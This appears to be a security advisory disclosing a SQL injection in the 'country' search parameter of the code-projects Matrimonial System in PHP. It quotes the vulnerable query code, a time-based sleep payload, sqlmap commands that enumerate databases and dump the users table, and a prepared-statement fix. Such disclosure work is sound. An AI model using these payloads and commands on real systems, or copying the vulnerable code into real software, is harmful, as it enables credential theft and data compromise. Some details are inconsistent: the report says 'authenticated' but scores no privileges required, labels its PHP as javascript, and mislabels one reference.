
**Title:** Critical SQL Injection in code-projects Matrimonial System in PHP An authenticated remote attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full database compromise. 

**Severity:** Critical 
 
**Researcher:** Karan Parelkar

**Executive Summary**

During an security assessment of the open-source Matrimonial System IN PHP, CSS, JS, AND MYSQL published on code-projects.org, a critical SQL Injection vulnerability was identified in  the Regular search functionality. 
The vulnerability exists because user-controlled input from the country parameter is concatenated directly into an SQL query without server-side sanitization or parameterized  statements. 
Successful exploitation allows an attacker to: 

• Execute arbitrary SQL queries  
• Enumerate databases  
• Extract sensitive user credentials  
• Obtain administrative account credentials  

Testing was performed only against a locally deployed instance for researchpurposes. 

**Affected Product** 

Item Details 
Matrimonial System IN PHP, CSS, JS, AND MYSQL
Source: https://code-projects.org/matrimonial-system-in-php-css-js-and-mysql-free-download/
Version:  1.0 
Language:  PHP 
Database: MySQL 
Server: Apache 
Operating System Windows (XAMPP Test Environment)

**Vulnerability Classification**

CWE-89 
Improper Neutralization of Special Elements used in an SQL Command (SQL Injection) OWASP Top 10 
A03:2021 – Injection 


**Vulnerability Details**

Vulnerable Endpoint: POST /search.php

Vulnerable Parameter: country

Root Cause: The application constructs SQL statements by directly concatenating user-supplied values into SQL queries.
The vulnerable code is located in functions.php, inside the search() function (called by search.php):

```javascript $sex = $_POST['sex'];
$agemin = $_POST['agemin'];
$agemax = $_POST['agemax'];
$maritalstatus = $_POST['maritalstatus'];
$country = $_POST['country'];
$state = $_POST['state'];
$religion = $_POST['religion'];
$mothertounge = $_POST['mothertounge'];

$sql = "SELECT * FROM customer WHERE 
sex='$sex' 
AND age>='$agemin'
AND age<='$agemax'
AND maritalstatus = '$maritalstatus'
AND country = '$country'
AND state = '$state'
AND religion = '$religion'
AND mothertounge = '$mothertounge'
";

$result = mysqlexec($sql);

```

Because no parameterized query or escaping mechanism is used, arbitrary SQL statements can be injected via the country parameter. The mysqlexec() function executes the query directly via mysqli_query() with no sanitization applied at any layer, allowing the injected payload to reach the database unfiltered.

**Proof of Concept** 

Step 1 – search page 

The vulnerable Regular search form accepts a user-controlled country parameter.

[!POC(images/sqli%20para.png]

Step 2 – Vulnerable Source Code 

The search function directly embeds POST parameters into the SQL query

[!POC(images/sqli%20para.png]

The ‘ in parameter leads to MySQL error confirming SQL injection 

[!POC(images/sqli%20para.png]

Step 3 – Manual SQL Injection 
The intercepted POST request was modified by injecting a time-based SQL payload into the  country parameter. 

Payload: sex=male&maritalstatus=Single&country=Dubai'%2b(select*from(select(sleep(20)))a)%2b'&district=Calicut&state=Kerala&religion=Christian-All&mothertounge=Tamil&agemin=19&agemax=50&search=Search

[!POC(images/sqli%20para.png]

The application response was delayed by approximately 20 seconds, confirming successful  time-based blind SQL injection.

Step 4 – SQLMap Verification 

The captured request was supplied to SQLMap.

command: ```python python .\sqlmap.py -r .\code_test_1.txt -p country --dbs ```

SQLMap confirmed that the country parameter is injectable using: 
• Boolean-based Blind SQL Injection  
• Error-based SQL Injection  
• Time-based Blind SQL Injection 

[!POC(images/sqli%20para.png]
[!POC(images/sqli%20para.png]

Database Enumeration 
Using SQLMap, multiple databases were successfully enumerated. 
information_schema 
matrimony
mysql 
performance_schema 
phpmyadmin 
test

[!POC(images/sqli%20para.png]
[!POC(images/sqli%20para.png]

Credential Disclosure 
The vulnerable SQL Injection allowed extraction of user records from the application's  database.
command: ```python python .\sqlmap.py -r .\code_test_1.txt -p country -D matrimony -T users --dump```

[!POC(images/sqli%20para.png]

The following sensitive information was retrieved: 
• Usernames  
• Passwords  
• User Level
•  email
• date of birth
• gender


**Impact**

Successful exploitation may allow an attacker to: 
• Execute arbitrary SQL statements  
• Enumerate databases  
• Dump sensitive application data  
• Obtain administrative credentials  
• Compromise confidentiality of stored information  


CVSS v3.1 
Base Score 
9.8 (Critical) 
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Remediation**

Developers should: 
• Replace dynamic SQL with prepared statements.  
• Use parameterized queries (PDO or MySQLi).  
• Validate and sanitize all user input.  
• Enable centralized logging and monitoring.  




**Secure Coding Example**

**Vulnerable**

```javascript
function search(){
  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $agemin=$_POST['agemin'];
    $agemax=$_POST['agemax'];
    $maritalstatus=$_POST['maritalstatus'];
    $country=$_POST['country'];
    $state=$_POST['state'];
    $religion=$_POST['religion'];
    $mothertounge=$_POST['mothertounge'];
    $sex = $_POST['sex'];
    $sql="SELECT * FROM customer WHERE 
    sex='$sex' 
    AND age>='$agemin'
    AND age<='$agemax'
    AND maritalstatus = '$maritalstatus'
    AND country = '$country'
    AND state = '$state'
    AND religion = '$religion'
    AND mothertounge = '$mothertounge'
    ";
    $result = mysqlexec($sql);
    return $result;
  }
}

```

**Secure**

```javascript 
function search(){
  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $agemin        = $_POST['agemin'];
    $agemax        = $_POST['agemax'];
    $maritalstatus = $_POST['maritalstatus'];
    $country       = $_POST['country'];
    $state         = $_POST['state'];
    $religion      = $_POST['religion'];
    $mothertounge  = $_POST['mothertounge'];
    $sex           = $_POST['sex'];

    // Whitelist validation as an extra layer of defense
    if (!in_array($sex, ['male', 'female'])) {
        die("Invalid input");
    }

    $host="localhost";
    $username="root";
    $password="";
    $db_name="matrimony";

    $conn = mysqli_connect($host, $username, $password, $db_name) or die("cannot connect");

    $sql = "SELECT * FROM customer WHERE 
            sex = ? 
            AND age >= ? 
            AND age <= ? 
            AND maritalstatus = ? 
            AND country = ? 
            AND state = ? 
            AND religion = ? 
            AND mothertounge = ?";

    $stmt = mysqli_prepare($conn, $sql);
    mysqli_stmt_bind_param(
        $stmt, "ssssssss",
        $sex, $agemin, $agemax, $maritalstatus,
        $country, $state, $religion, $mothertounge
    );
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);

    return $result;
  }
}

```


**References** 
• Product Inventory System in PHP (code-projects.org) (https://code-projects.org/matrimonial-system-in-php-css-js-and-mysql-free-download/) 
• CWE-89 – SQL Injection  
• OWASP SQL Injection Prevention Cheat Sheet  
• OWASP Top 10 2021 – Injection  

**Researcher Information** 
Name: Karan Parelkar 
Independent Security Researcher 
Email: karan.parelkar2005@gmail.com 
GitHub: https://github.com/KaranParelkar 
LinkedIn: https://www.linkedin.com/in/karan-parelkar
